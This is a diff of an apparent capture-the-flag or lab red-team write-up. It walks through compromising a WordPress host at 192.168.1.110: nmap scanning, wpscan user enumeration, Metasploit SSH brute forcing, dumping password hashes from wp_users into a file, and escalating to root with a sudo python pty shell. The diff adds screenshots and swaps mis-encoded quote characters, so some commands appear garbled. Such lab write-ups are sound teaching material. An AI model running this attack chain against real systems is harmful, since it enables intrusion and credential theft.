@@ -14,6 +14,8 @@ $ nmap -sV 192.168.1.110
 
 This scan identifies the services below as potential points of entry:
 
+![nmap](https://user-images.githubusercontent.com/92223941/167321518-58e91c5d-a017-4528-8e63-25930c171f48.PNG)
+
 * Target 1
 	- Port 22/TCP SSH
 	- Port 80/TCP http
@@ -31,13 +33,16 @@ The following vulnerabilities were identified on each target:
 
 Exploitation
 
-The Red Team was able to penetrate†Target 1†and retrieve the following confidential data:
+The Red Team was able to penetrate¬†Target 1¬†and retrieve the following confidential data:
 
 * Target 1
-	- flag1.txt:†b9bbcb33e11b80be759c4e844862482d
+	- flag1.txt:¬†b9bbcb33e11b80be759c4e844862482d
 		- Exploit Used
 			- Used wpscan to enumerate the user from the      wordpress website
-			- wpscan ñurl http://192.168.1.110/wordpress -enumerate u
+			- wpscan ‚Äìurl http://192.168.1.110/wordpress -enumerate u
+		
+![flag1a](https://user-images.githubusercontent.com/92223941/167321576-2bd89b98-b0f5-4344-af0c-af68e24d44ae.PNG)
+![flag1b](https://user-images.githubusercontent.com/92223941/167321593-fa2222a3-87f8-4664-9b9a-545625968773.PNG)
 
 
 			- Used SSH scanner module on Metasploit to brute force login attempts with the username and Michael and wordlists from Kali
@@ -62,16 +67,16 @@ The Red Team was able to penetrate†Target 1†and retrieve the following confident
 
 			- I then went into the service.html file and found flag1.
 			- nano service.html
-			-  ctrl+w ìflagî
+			-  ctrl+w ‚Äúflag‚Äù
 
-	- flag2.txt:†fc3fd58dcdad9ab23faca6e9a36e581c
+	- flag2.txt:¬†fc3fd58dcdad9ab23faca6e9a36e581c
 		- Exploit Used
 			- I went back one directory and listed the files and found flag 2
 			- cd ..
 			- ls
 			- cat flag2.txt
 
-	- flag3.txt:†afc01ab56b50591e7dccf93122770cd2
+	- flag3.txt:¬†afc01ab56b50591e7dccf93122770cd2
 		- Exploit Used
 			- I went back to the html directory and went into the wordpress directory and listed the directories
 			- cd html
@@ -93,26 +98,26 @@ The Red Team was able to penetrate†Target 1†and retrieve the following confident
 			- select * from wp_posts;
 
 
-	- Flag4.txt:†715dea6c055b9fe3337544932f2941ce
+	- Flag4.txt:¬†715dea6c055b9fe3337544932f2941ce
 		- Exploit Used
 			- While still being logged in via sql I described the table wp_users
 			- describe wp_users;
 
 			- I then formatted the username and passwords being separated by a colon sign.
-			- select concat_ws(ë:í, user_login, user_pass) from wp_users;
+			- select concat_ws(‚Äò:‚Äô, user_login, user_pass) from wp_users;
 
 			- I then outputted the formatted table into text file in the www directory and then viewed the file under michael
-			- select concat_ws(ë:í, user_login, user_pass) from wp_users into outfile ëvar/www/wp_hashes.txtí;
+			- select concat_ws(‚Äò:‚Äô, user_login, user_pass) from wp_users into outfile ‚Äòvar/www/wp_hashes.txt‚Äô;
 			- cat wp_hashes.txt
 
-			- I copied wp_hashes.txt file and exited Michaelís computer and pasted the file on www directory on my pc
-			- ìcopied username and passwordsî
+			- I copied wp_hashes.txt file and exited Michael‚Äôs computer and pasted the file on www directory on my pc
+			- ‚Äúcopied username and passwords‚Äù
 			- Exit
 			- cd /var/www
 			- ls
 			- touch wp_hashes.txt
 			- nano wps_hashes.txt
-			- ìpasted username and passwordsî
+			- ‚Äúpasted username and passwords‚Äù
 
 
 
@@ -126,7 +131,7 @@ The Red Team was able to penetrate†Target 1†and retrieve the following confident
 			- ssh steven password:pink84
 
 			- I ran a python command to login via root
-			- sudo python -c ëimport pty:pty.spawn(ì/bin/bashî)í
+			- sudo python -c ‚Äòimport pty:pty.spawn(‚Äú/bin/bash‚Äù)‚Äô
 
 			- I then went into the root directory I ran the list command and found flag 4 and then I viewed the flag
 			- cd /root
